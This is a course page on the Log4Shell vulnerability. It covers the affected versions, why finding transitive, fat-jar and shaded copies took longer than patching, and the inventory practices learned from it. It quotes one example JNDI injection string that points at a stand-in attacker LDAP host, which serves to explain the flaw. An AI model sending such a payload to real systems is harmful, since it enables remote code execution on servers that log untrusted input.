---
title: "The log4shell lesson"
sidebar_label: "3 · The log4shell lesson"
sidebar_position: 3
---

<span className="db-tier t-understand">Understand</span>

> Verified: 2026-08-19 against the Apache Log4j 2 security page for
> **CVE-2021-44228** (CVSS 10.0; affected 2.0-beta9–2.3.0, 2.4–2.12.1,
> 2.13.0–2.14.1; fixed in 2.3.1 for Java 6, 2.12.2 for Java 7, 2.15.0 for
> Java 8+), **CVE-2021-45046** (CVSS 9.0; fixed in 2.3.1, 2.12.3, 2.16.0) and
> **CVE-2021-45105** (CVSS 5.9, denial of service via recursive lookup
> evaluation; fixed in 2.3.1, 2.12.3, 2.17.0); the Apache guidance that only
> **`log4j-core`** is affected — an application using `log4j-api` alone is
> not — and the `JndiLookup.class` removal mitigation; and the Maven
> dependency-plugin documentation for `dependency:tree`. Public disclosure
> was **9 December 2021**.

**Log4shell is taught as a patching story and it was not one. The patch was
available almost immediately and was a one-line version bump. What took large
organisations days — in some cases weeks — was answering a question that
sounds trivial: *do we use this, and where?* Every practice in the previous
two chunks exists because that question had no fast answer, and the reason it
had no fast answer is that the dependency was usually transitive, frequently
inside a fat jar, and occasionally shaded into invisibility.**

## What the vulnerability actually was

Log4j 2 supported **lookups** inside log messages: a substitution syntax
evaluated when a message was formatted. One of those lookups was JNDI. So a
string like `${jndi:ldap://attacker.example/a}`, if it reached a log
statement, made the logging library open a connection to an attacker-supplied
LDAP server and load a class from it — remote code execution, at whatever
privilege the JVM held.

The reason it scored CVSS **10.0** is the *reachability*. The attacker did not
need an account, a specific endpoint, or knowledge of your stack. Anything
that ends up in a log line was an attack surface: a `User-Agent` header, a
username in a failed-login message, a filename, a chat message, a device name.
Applications log untrusted input everywhere, by design.

Timeline and versions, precisely:

| CVE | Score | Affected | Fixed in |
|---|---|---|---|
| CVE-2021-44228 | 10.0 | `log4j-core` 2.0-beta9–2.3.0, 2.4–2.12.1, 2.13.0–2.14.1 | 2.3.1 (Java 6), 2.12.2 (Java 7), **2.15.0** (Java 8+) |
| CVE-2021-45046 | 9.0 | incomplete fix — Thread Context lookups still reachable | 2.3.1, 2.12.3, **2.16.0** |
| CVE-2021-45105 | 5.9 | denial of service via infinite recursion in lookup evaluation | 2.3.1, 2.12.3, **2.17.0** |

Disclosure was 9 December 2021. Note what the second and third rows mean in
practice: teams that patched to 2.15.0 patched again to 2.16.0 days later, and
some again to 2.17.0. **A security upgrade is not a one-time event during an
active incident** — which is its own lesson about pinning a version and
walking away.

Two details that mattered enormously at the time and are still worth knowing:

- **Only `log4j-core` is affected.** An application depending on `log4j-api`
  alone is not vulnerable to CVE-2021-44228. A great deal of incident-response
  effort went into artifacts that were never exposed, because scanners and
  spreadsheets said "log4j".
- **The configuration mitigations were partial.** Removing the class from the
  jar — `zip -q -d log4j-core-*.jar org/apache/logging/log4j/core/lookup/JndiLookup.class`
  — was the reliable stopgap, while the `formatMsgNoLookups` property proved
  insufficient against the follow-on CVE. This is the general pattern:
  configuration mitigations for a known-vulnerable library buy you hours, not
  a resolution. The fix is the upgrade.

## The part that actually cost the time

Almost nobody had `org.apache.logging.log4j:log4j-core` in their POM. It
arrived as a transitive dependency of something else, or inside a packaged
application, or inside a vendor's appliance. The question "are we affected?"
therefore decomposed into a set of questions that most organisations had no
tooling for:

1. **Which of our services depend on it, at what version, including
   transitively?** Answerable per repository with `dependency:tree` — if you
   have the source, a working build, and someone to run it 200 times.
2. **Which of our *deployed* artifacts contain it?** A different question. The
   deployed jar was built weeks ago from a commit you may not be looking at.
3. **Which third-party products we run contain it?** Not answerable by you at
   all; you wait for each vendor's advisory.
4. **Which of the above are actually exposed to untrusted input?** The
   prioritisation question, and the last one anybody got to.

`dependency:tree` was the workhorse for the first:

```bash
mvn dependency:tree -Dincludes=org.apache.logging.log4j
./gradlew dependencies --configuration runtimeClasspath
```

That is not a security tool. It is the ordinary build-inspection command from
[transitive dependencies and mediation](../03-transitive-and-mediation/README.md) — used at scale,
under pressure, by people who had never needed it before. Which is the point: **an
SBOM published with every release artifact turns question 2 into a database
query**, and a dependency inventory across repositories turns question 1 into
the same. Those are not compliance paperwork; they are the operational tools
that decide whether an incident costs hours or weeks.

## The shading blind spot

`dependency:tree` reports Maven coordinates — what the build *declared*, plus
what resolution pulled in. It does not report what is physically inside a jar
file. Those diverge in two common ways:

- **Fat / uber jars.** A vendor ships one artifact containing the classes of
  fifty libraries. To Maven that is *one* dependency with one coordinate.
  Log4j's classes may be in there; its coordinate is not.
- **Shading with relocation.** maven-shade-plugin (and Gradle's Shadow plugin)
  can rewrite package names — `org.apache.logging.log4j` becomes
  `com.vendor.shaded.org.apache.logging.log4j` — specifically so two versions
  of a library can coexist. Now even a package-name scan misses it.

So during log4shell there were three tiers of visibility, and they had to be
searched differently:

| Where it is | Found by |
|---|---|
| Declared or transitive dependency | `dependency:tree`, an SBOM, any scanner |
| Bundled inside a fat jar, unrelocated | recursive archive scanning — unpack nested jars and look at the classes and their hashes |
| Shaded with package relocation | bytecode/content analysis — matching class *shapes* and hashes rather than names |

This is exactly the false-negative case from
[chunk 2](02-cve-scanning-and-sboms.md): a scan that finds nothing has not
proven anything if the artifact never presented usable evidence. It is also
the reason **your build should generate its SBOM at package time from the
resolved graph**, and the reason "we shade to avoid conflicts" is a decision
with a security cost attached, not just a packaging convenience.

## What to institutionalise

The honest version of the lesson is not "scan your dependencies". It is:

- **Publish an SBOM with every deployable, and keep it.** Attach it to the
  artifact in the repository. The question you will be asked is about a build
  from six weeks ago.
- **Keep a queryable inventory across repositories**, so "who depends on X"
  does not require cloning 200 projects.
- **Know your shaded and vendored artifacts by name.** They are the ones no
  tool will answer for; someone has to have written them down.
- **Rehearse the bump.** The measurable capability is "how long from *a fix
  exists* to *it is in production*". If that number is unknown, it is long.
  A dependency bump that requires a two-week release train is a security
  control you do not have.
- **Own the exposure decision.** Record why something is not applicable — VEX
  — so it does not get re-argued at 2am.
- **Expect to patch more than once.** 2.15.0 → 2.16.0 → 2.17.0 happened inside
  ten days.

None of that is exotic, and all of it is cheap *before* an incident and
impossible during one.

## Gotchas

**Symptom:** the CVE report flags `log4j-api` and a team spends a day on an artifact that was never vulnerable
**Cause:** the finding was matched at the project level; only `log4j-core` carried the JNDI lookup implementation
**Fix:** read the advisory's affected-artifact list, not just the project name — "we use log4j" and "we ship the vulnerable artifact" are different statements

**Symptom:** `dependency:tree` shows no vulnerable dependency, and a scan of the deployed artifact finds the classes anyway
**Cause:** the library is bundled inside a vendor's fat jar, or shaded with relocated packages, so no Maven coordinate for it exists
**Fix:** scan artifact *contents* recursively, not just the resolved graph; maintain a written list of the vendored and shaded artifacts nobody's dependency tool can see

**Symptom:** you patched to the version the first advisory named, and a week later you are patching again
**Cause:** the initial fix was incomplete — 2.15.0 addressed CVE-2021-44228, CVE-2021-45046 required 2.16.0, CVE-2021-45105 required 2.17.0
**Fix:** during an active incident, subscribe to the upstream security page rather than acting on one advisory; treat "patched" as provisional until the CVE series stops moving

**Symptom:** the configuration flag was set everywhere and the system was still exploitable
**Cause:** `formatMsgNoLookups` did not close every path, and the class-removal mitigation applied to a narrower version range than people assumed
**Fix:** treat configuration mitigations as a way to buy hours while the upgrade ships, never as the resolution; the historical record on "mitigate instead of upgrade" is poor

**Symptom:** the fix is a one-line version bump and it takes eleven days to reach production
**Cause:** the release process was never exercised for an emergency single-dependency change — approvals, a fixed release train, manual QA
**Fix:** measure and rehearse the fix-to-production time as its own capability; it is the number that determines the cost of the next log4shell, not the scanning tooling

**Symptom:** six weeks later, nobody can say which build of which service shipped the vulnerable version
**Cause:** the inventory only ever existed as a live query against current source; nothing was recorded per released artifact
**Fix:** generate and store an SBOM at package time for every deployable — the question is always about a build in the past

## Interview questions

**★ What was CVE-2021-44228, mechanically?**
Log4j 2 evaluated substitution *lookups* inside log messages, and one of them
was JNDI. A string such as `${jndi:ldap://…}` appearing in a logged message
caused the library to fetch and load a class from an attacker-controlled
server — remote code execution. It scored CVSS 10.0 because no authentication
or specific endpoint was needed: any untrusted value that reaches a log
statement, such as a `User-Agent` header or a username, was an attack vector.
Only `log4j-core` was affected; `log4j-api` alone was not.

**★ Why was log4shell hard for organisations if the patch was a version bump?**
Because the hard question was not "how do we fix it" but "do we have it".
Almost nobody declared `log4j-core` directly — it arrived transitively, inside
fat jars, and inside third-party products. Answering required a per-repository
dependency walk for source you own, an artifact-content scan for what you
deployed, and a wait for every vendor's advisory. Most organisations had
tooling for none of those, so days went into inventory before any patching
started.

**★ Why can a `dependency:tree` come back clean and the artifact still be vulnerable?**
Because the tree reports *coordinates* — what the build declared and what
resolution added — not the physical contents of jars. A library bundled inside
a vendor's uber jar has no coordinate of its own, and shading with package
relocation renames the classes so even a package-name search misses them.
Detecting those requires unpacking nested archives and matching class content
or hashes rather than names.

**★ What does this incident say about "mitigate now, upgrade later"?**
That the mitigations are a stopgap and should be treated as one. Removing
`JndiLookup.class` from the jar was effective for the version range it applied
to; the `formatMsgNoLookups` property turned out not to close every path, and
the fix itself needed two further releases (2.16.0, 2.17.0) before the series
settled. Configuration mitigations buy hours while the upgrade ships. They are
not a resolution, and treating them as one leaves you exposed to the
follow-on CVE nobody has published yet.

**★ Your CTO asks what we would do differently next time. What is on your list?**
Publish an SBOM with every deployable and keep it attached to the artifact, so
the question "what did that six-week-old build contain" is a query. Keep a
cross-repository dependency inventory so "who depends on X" is not 200 clones.
Write down the vendored and shaded artifacts that no dependency tool can see.
Record exploitability decisions as VEX so they are not re-argued under
pressure. And measure the one number that actually governs the cost — the time
from "a fix exists" to "it is in production" — then rehearse it, because a
one-line bump that takes eleven days to ship is not a fast fix.

---

← Prev: [CVE scanning and SBOMs](02-cve-scanning-and-sboms.md) · Index: [Phase 8 — The build: Maven, Gradle and dependencies](../README.md) · Next → [Jar anatomy](../08-jar-anatomy/README.md)
